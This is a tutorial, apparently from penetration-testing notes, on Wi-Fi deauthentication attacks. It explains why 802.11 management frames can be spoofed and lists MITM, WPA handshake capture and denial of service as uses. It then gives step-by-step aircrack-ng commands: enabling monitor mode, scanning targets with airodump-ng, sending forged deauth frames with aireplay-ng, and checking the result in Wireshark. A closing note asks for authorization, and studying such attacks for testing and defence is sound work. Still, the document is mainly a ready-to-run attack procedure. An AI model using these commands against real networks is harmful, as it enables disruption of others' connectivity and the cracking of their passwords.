# Deauthentication Attack

## Theory
Deauthentication attacks exploit vulnerabilities in the 802.11 Wi-Fi protocol, specifically in the management frames. These frames are responsible for maintaining the connection between a client (station) and an Access Point (AP). Since management frames are not encrypted, they can be easily spoofed by an attacker.

By sending forged deauthentication frames, an attacker can force a client to disconnect from the AP. This can be used for:
- **Man-in-the-Middle (MITM) attacks**: Forcing a client to reconnect to a rogue AP.
- **Capturing WPA handshakes**: Useful for cracking WPA/WPA2 passwords.
- **Denial of Service (DoS)**: Disrupting network connectivity.

Deauthentication attacks are particularly effective in public Wi-Fi networks where encryption is weak or absent.

## Tools Required
- `aircrack-ng` suite (includes `airodump-ng` and `aireplay-ng`)
- `Wireshark` for traffic analysis and verification
- A wireless network adapter capable of monitor mode and packet injection

## Steps to Perform Deauthentication Attack

### Step 1: Enable Monitor Mode
First, enable monitor mode on your wireless interface. This allows you to capture and inject packets.

```bash
sudo airmon-ng start wlan0
```

Expected output:
```
Interface   Chipset         Driver
wlan0       Atheros         ath9k - [phy0]
                (monitor mode enabled on wlan0mon)
```

### Step 2: Capture Wireless Traffic
Use `airodump-ng` to scan for available networks and identify the target AP and client.

```bash
sudo airodump-ng wlan0mon
```

Expected output:
```
 BSSID              PWR  Beacons  #Data, #/s  CH  MB   ENC  CIPHER  AUTH ESSID
 00:14:6C:7E:40:80  -50      100     50    0   6  54e  WPA2  CCMP    PSK  MyWiFi

 STATION            PWR   Rate   Lost  Frames  Probe
 00:25:9C:CF:1C:9E  -40   36e     0     200   MyWiFi
```

- **BSSID**: MAC address of the AP.
- **STATION**: MAC address of the client.

### Step 3: Launch Deauthentication Attack
Send deauthentication frames to disconnect the client from the AP.

```bash
sudo aireplay-ng -0 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon
```

- `-0 10`: Sends 10 deauthentication packets.
- `-a [AP_MAC]`: MAC address of the target AP.
- `-c [CLIENT_MAC]`: MAC address of the client.

Expected output:
```
Sending 10 deauthentication frames
```

### Step 4: Verify the Attack
Use `Wireshark` to monitor the traffic and confirm that deauthentication frames are being sent.

```bash
sudo wireshark
```

Filter for deauthentication frames:
```
wlan.fc.type_subtype == 0x0c
```

Expected output:
You should see multiple deauthentication frames in the packet capture.

### Notes
- Ensure you have permission to perform this attack on the target network.
- Use this technique responsibly for educational or authorized penetration testing purposes only.
